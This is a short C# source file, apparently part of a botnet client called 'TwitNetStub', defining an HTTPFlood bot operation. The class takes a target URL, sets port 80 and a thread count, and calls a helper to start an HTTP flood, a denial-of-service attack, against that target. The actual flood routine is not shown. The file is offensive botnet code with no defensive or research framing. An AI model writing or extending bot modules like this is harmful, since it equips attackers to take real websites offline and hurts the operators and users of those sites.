using System;
using TwitNetStub.Util.Network;

namespace TwitNetStub.Operations
{
    class HTTPFlood : IBotOperation
    {
        public bool Finished { get; set; }
        private string MainURL;
        private int Port;
        private int Threads;

        public HTTPFlood (string url)
        {
            MainURL = url;
        }

        public void Initialize()
        {
           Port = 80;
           Threads = 1; 
        }
        public void Run()
        {
            HTTP.SfHost = MainURL;
            HTTP.Port = Port;
            HTTP.Threads = Threads;
            HTTP.StartHTTPFlood();
            //Finished = true;
        }
    }
}
